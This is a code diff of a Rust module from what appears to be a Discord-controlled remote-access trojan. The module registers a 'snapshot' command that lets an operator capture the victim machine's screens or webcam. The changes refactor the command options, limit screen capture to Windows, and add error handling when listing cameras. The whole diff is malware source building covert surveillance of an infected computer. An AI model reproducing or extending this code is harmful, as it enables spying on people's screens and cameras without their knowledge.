@@ -1,7 +1,7 @@
-use crate::{errors::DiscordC2Error, libraries::nokhwa_wrapper::wrapper};
+use crate::{errors::DiscordC2Error, libraries::nokhwa_wrapper::wrapper, discord_utils::bot_functions::send_channel_message, utils::agent::get_or_create_agent};
 
 use serenity::{
-    builder::CreateApplicationCommand,
+    builder::{CreateApplicationCommand, CreateApplicationCommandOption},
     client::Context,
     model::{
         application::command::CommandOptionType,
@@ -14,14 +14,66 @@ use serenity::{
 };
 
 use chrono::Utc;
-use nokhwa::utils::CameraIndex;
+use nokhwa::utils::{CameraIndex, CameraInfo};
 use screenshots::Screen;
 use std::borrow::Cow;
+use tracing::error;
+
+fn create_screen_option(
+    sub_command: &mut CreateApplicationCommandOption,
+) -> &mut CreateApplicationCommandOption {
+    let screens = Screen::all().unwrap(); //TODO: check for errors
+    let mut screen_option = sub_command
+        .name("screen")
+        .description("Take a snapshot of the screen")
+        .kind(CommandOptionType::SubCommand);
+    screen_option = screen_option.create_sub_option(|option| {
+        let mut screen_list_option = option
+            .name("screen_list")
+            .description("Choose a screen from the list")
+            .kind(CommandOptionType::Integer)
+            .required(true);
+
+        for i in 0..screens.len() {
+            screen_list_option =
+                screen_list_option.add_int_choice(format!("Screen {}", i), i as i32);
+        }
+        screen_list_option
+    });
+    screen_option
+}
+
+fn create_camera_option(
+    sub_command: &mut CreateApplicationCommandOption,
+    cameras: Vec<CameraInfo>,
+) -> &mut CreateApplicationCommandOption {
+    let mut camera_option = sub_command
+        .name("camera")
+        .description("Take a snapshot from a camera")
+        .kind(CommandOptionType::SubCommand);
+
+    camera_option = camera_option.create_sub_option(|option| {
+        let mut camera_list_option = option
+            .name("camera_list")
+            .description("Choose a camera from the list")
+            .kind(CommandOptionType::Integer)
+            .required(true);
+
+        // Add integer choices to the camera list option based on the number of cameras.
+        for (i, camera) in cameras.iter().enumerate() {
+            camera_list_option = camera_list_option.add_int_choice(
+                format!("{} ({})", camera.human_name(), camera.description()),
+                i as i32,
+            );
+        }
+
+        camera_list_option
+    });
+
+    camera_option
+}
 
 pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
-    let cameras = wrapper::list_devices().unwrap(); //TODO: check for errors
-    let screens = Screen::all().unwrap(); //TODO: check for errors
-
     // Create the snapshot command.
     let snapshot_command = command
         .name("snapshot")
@@ -29,56 +81,29 @@ pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicatio
 
     // This is just a depression mess not worth commenting out.
     snapshot_command.create_option(|option| {
-        option
+        let option = option
             .name("type")
             .description("Type of snapshot to grab")
-            .kind(CommandOptionType::SubCommandGroup)
-            .create_sub_option(|sub_command| {
-                let mut screen_option = sub_command
-                    .name("screen")
-                    .description("Take a snapshot of the screen")
-                    .kind(CommandOptionType::SubCommand);
-                screen_option = screen_option.create_sub_option(|option| {
-                    let mut screen_list_option = option
-                        .name("screen_list")
-                        .description("Choose a screen from the list")
-                        .kind(CommandOptionType::Integer)
-                        .required(true);
+            .kind(CommandOptionType::SubCommandGroup);
 
-                    for i in 0..screens.len() {
-                        screen_list_option =
-                            screen_list_option.add_int_choice(format!("Screen {}", i), i as i32);
-                    }
-                    screen_list_option
-                });
-                screen_option
-            })
-            .create_sub_option(|sub_command| {
-                let mut camera_option = sub_command
-                    .name("camera")
-                    .description("Take a snapshot from a camera")
-                    .kind(CommandOptionType::SubCommand);
+        #[cfg(target_os = "windows")] //TODO: Explore how we can support linux here
+        option.create_sub_option(|sub_command| create_screen_option(sub_command));
 
-                camera_option = camera_option.create_sub_option(|option| {
-                    let mut camera_list_option = option
-                        .name("camera_list")
-                        .description("Choose a camera from the list")
-                        .kind(CommandOptionType::Integer)
-                        .required(true);
+        // Error handle for the camera option
+        let cameras = match wrapper::list_devices() {
+            Ok(cameras) => cameras,
+            Err(e) => {
+                error!("Error retrieving camera list: {}", e);
+                Vec::new()
+            }
+        };
+        
+        // Will only display the option if there was no error.
+        if !cameras.is_empty() {
+            option.create_sub_option(|sub_command| create_camera_option(sub_command, cameras));
+        }
 
-                    // Add integer choices to the camera list option based on the number of cameras.
-                    for (i, camera) in cameras.iter().enumerate() {
-                        camera_list_option = camera_list_option.add_int_choice(
-                            format!("{} ({})", camera.human_name(), camera.description()),
-                            i as i32,
-                        );
-                    }
-
-                    camera_list_option
-                });
-
-                camera_option
-            })
+        option
     });
 
     command
